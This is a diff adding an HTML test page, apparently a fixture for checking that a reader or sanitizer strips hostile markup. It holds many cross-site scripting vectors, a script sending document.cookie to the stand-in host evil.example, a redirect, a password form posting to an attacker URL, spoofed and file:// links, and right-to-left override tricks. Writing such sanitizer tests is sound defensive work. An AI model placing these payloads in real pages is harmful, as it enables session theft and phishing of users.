@@ -1,0 +1,12 @@
+<html><head><title>Notes &#x202E;fdp.exe</title><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">
+<style>body{background:url(https://evil.example/s.png)}</style><script>document.location="https://evil.example/?c="+document.cookie</script></head>
+<body onload="alert(1)"><article><h1>Hostile notes</h1>
+<p onclick="alert(2)">This page tries every trick a page can play on a reader, and the reader keeps only its words, its http links and its pictures.</p>
+<p><a href="javascript:alert(3)">script link</a>, <a href="JaVaScRiPt:alert(4)">mixed case</a>, <a href=" java&#x09;script:alert(5)">tabbed</a>, <a href="data:text/html,<script>alert(6)</script>">data link</a>, <a href="file:///etc/passwd">file link</a>, <a href="vbscript:x">vb link</a>, <a href="https://bank.example@evil.example/">a bank</a>, <a href="https:\\evil.example">backslashes</a>.</p>
+<p>Raw &lt;img src=x onerror=alert(7)&gt; and [x](javascript:alert(8)) and ![i](https://evil.example/t.png) are text; <b onmouseover="alert(9)">bold</b> words stay.</p>
+<img src="javascript:alert(10)" alt="js picture"><img src="file:///etc/hosts" alt="file picture"><img src=x onerror="alert(11)" alt="&#x202E;evil">
+<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o.swf"></object><embed src="https://evil.example/e.swf">
+<svg><script>alert(12)</script><a href="https://evil.example/svg">svg link</a></svg><template><p>template text</p></template>
+<form action="https://evil.example/steal"><input name=pw><button>Send</button></form>
+<p>Direction &#x202E;txt.exe&#x202C; and zero&#x200B;width and a NUL &#0; and bell &#7; are dropped.</p>
+<p><a href="https://acme.example/ok">a fine link</a></p></article></body></html>
